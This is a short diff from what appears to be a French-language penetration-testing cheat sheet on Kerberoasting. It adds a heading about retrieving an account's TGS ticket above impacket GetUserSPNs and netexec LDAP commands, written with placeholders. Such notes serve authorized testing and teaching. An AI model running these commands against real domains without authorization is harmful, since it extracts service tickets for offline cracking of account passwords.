@@ -76,6 +76,7 @@ netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --query "(servicePrincipalName=*)" 
 GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
 
+## Récupérer le ticket TGS du compte
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP -request
 ```
 
